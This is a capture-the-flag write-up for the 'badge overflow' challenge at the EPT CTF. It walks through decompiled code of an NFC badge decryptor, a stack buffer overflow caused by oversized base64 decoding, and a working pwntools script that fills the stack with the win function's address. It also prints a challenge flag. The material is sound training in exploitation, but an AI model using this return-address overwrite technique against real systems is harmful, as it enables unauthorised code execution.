# badge overflow

Writeup by: GlaDius

## initial look

Uppon arrival for the physical EPT CTF we were presented with NFC badges.
These badges contained a text record with some base64 data in it.

The initial base64 content was:

```
DHBoSHdYAAJCF3p/SAN/HwRSLRd9Rw1QFAczFkIIJURjA0Y0IicxBw==
```

There was also a physical station present at the CTF where you could get this data decoded.
The original card data contained a simple flag, which the station would decrypt and present for you.
More about that later.

I did not look into this callenge, i jumped straight at the `badge overflow` pwn chall, in the hopes of getting a first blood.

The call provided a zip file `badgeoverflow.zip`, which then contained `read_badges.py` and `badge-decryptor`.
Clearly these files where the core of the software that was reading and decoding the badge data.

## read_badges.py

The python file was very simple:

```python
import subprocess

from acr122u import read_card


def process_card(card_data):
    result = subprocess.run(
        ["./badge_decryptor"],
        input=card_data.encode(),
        capture_output=True,
    )
    print(result.stdout.decode())
    if result.stderr:
        print(result.stderr.decode())


if __name__ == "__main__":
    while True:
        card_data = read_card()
        process_card(card_data)
```

It simple read the first text record from the card, and then sent that as stdin to `badge_decryptor`

## badge_decryptor

`badge_decryptor` was an ELF executable that would read and decode the text record.
It contained debug symbols, and had neither PIE nor did it have a stack canary.
So allready from a first glance this would seem like a stack based challenge.

```
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified     Fortifiable     FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   44 Symbols        No    0    badge-decryptor
```

uppon initially opening it in a decompiler, the symbol `solve_challenge` popped out as interesting,
as it would run a binary `challenge-submitter` which most likely would give out the flag.

```
004011d6    void solve_challenge() __noreturn
004011da        int64_t rbp
004011da        int64_t var_8 = rbp
004011e9        system(line: "./challenge-submitter")
004011f3        exit(status: 0)
004011f3        noreturn
```

i did not have `challenge-submitter`, so i made a small shell script to mimic the presumed behaviour:

```sh
#!/bin/sh
echo "some flag here!!!"
```

### data decoding

the main function of the decryptor looked like it simply base64 decodes the input, then xor-s it into an output buffer, and then prints the buffer

```
0040140a    int32_t main(int32_t argc, char** argv, char** envp)
00401419        char output[0x28]
00401419        __builtin_memset(dest: &output, ch: 0, count: 0x28)
00401441        char input[0x64]
00401441        __builtin_memset(dest: &input, ch: 0, count: 0x64)
00401441        
004014d2        if (fgets(buf: &input, n: 0x64, fp: stdin) == 0)
004014de            puts(str: "Failed to read input")
004014e3            return 1
004014e3        
00401518        xor_decrypt(input: &output, len: sx.q(base64_decode(&input, &output)))
00401533        printf(format: "%.40s\n", &output)
00401538        return 2
```

The function read into the input buffer is safe and fine, but `0x64` bytes of base64 become become `0x4b` bytes of data, not `0x28`.
This means that a large enough input would overflow the stack frame, and allow us to overwrite the return pointer.

The input data was XORed though, so the input would have to be as well

### data XOR

here is the decomp for the XOR function:

```
00401384    void* xor_decrypt(int64_t input, int64_t len)
00401404        void* i
00401404
00401404        for (i = nullptr; i u< len; i += 1)
004013f5            *(i + input) ^= *(i u% 0xa + "I <3 klarz")
004013f5        
00401409        return i
```

It is pretty clear to see that it simply xor-s the buffer with a static key, we could then just do the same to our input

### exploitation

Seeing as there were no good protections we can then simply overwrite the return pointer to the `solve_challenge` function and then get the flag.

To make things simple, and not have to work out the correct offsett for the return pointer, i simply filled the entire available space with addresses to the win function.

Here is the script i used to generate the data:

```python
from pwn import *
import base64

def xor_encode(data, key):
    """XOR encode data with a key string. cooked up by AI"""
    return bytes(a ^ b for a, b in zip(data, key.encode() * len(data)))

WIN = 0x004011d6
payload =xor_encode(p64(WIN) * 19, "I <3 klarz")
print(base64.b64encode(payload).decode())
```

and then to test on my local machin i could simply run `python3 solve.py | badge-decryptor` and get the output:

```
�@
some flag here!!!
```

clearly the payload worked, so i simply took the payload from `solve.py` and sent it to myself on discord.
When i had it on my phone i could use the `NFC Tools` app to overwrite the text record on my card, so that it contained my payload.

I then simply went to the badge decryption station, and scanned the card, and to my amazement was not presented with a flag, but rather that the station automatically submitted the flag for me, how neat <3.
But to my chagrin i was sadly 2 minutes too late to get the first blood :(

## The original challenge

As for the original payload and chal, the orignal payload was meant to be scanned and decrypted without editing, so by simply taking the data, and decoding + xor-ing with the static key in cyberchef,
it would simply spit out the flag to the original chal `EPT{W3lc0m3_t0_th3_m4g1c4l_w0rld_0f_NFC}`
